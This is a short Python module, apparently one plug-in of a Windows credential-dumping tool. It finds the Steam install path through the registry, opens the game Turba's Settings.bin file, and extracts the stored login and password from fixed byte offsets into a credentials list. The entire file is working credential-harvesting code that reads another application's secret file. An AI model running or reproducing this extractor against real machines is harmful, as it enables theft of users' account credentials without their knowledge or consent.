# -*- coding: utf-8 -*-
import os
from winsecs.utils import OpenKey, winreg, log


class Turba:
    def run(self):
        creds = []
        results = None

        # Find the location of steam - to make it easier we're going to use a try block
        # 'cos I'm lazy
        try:
            with OpenKey(winreg.HKEY_CURRENT_USER, 'Software\Valve\Steam') as key:
                results = winreg.QueryValueEx(key, 'SteamPath')
        except Exception:
            pass

        if not results:
            return

        steampath = results[0]
        steamapps = os.path.join(steampath, 'SteamApps\common')

        # Check that we have a SteamApps directory
        if not os.path.exists(steamapps):
            log.error('Steam doesn\'t have a SteamApps directory.')
            return

        filepath = os.path.join(steamapps, 'Turba\\Assets\\Settings.bin')

        if not os.path.exists(filepath):
            log.debug('Turba doesn\'t appear to be installed.')
            return

        # If we're here we should have a valid config file file
        with open(filepath, mode='rb') as filepath:
            # We've found a config file, now extract the creds
            data = filepath.read()
            chunk = data[0x1b:].split(b'\x0a')
            creds.append({'Login': chunk[0], 'Password': chunk[1]})
        return creds


modules = {"Turba": Turba()}
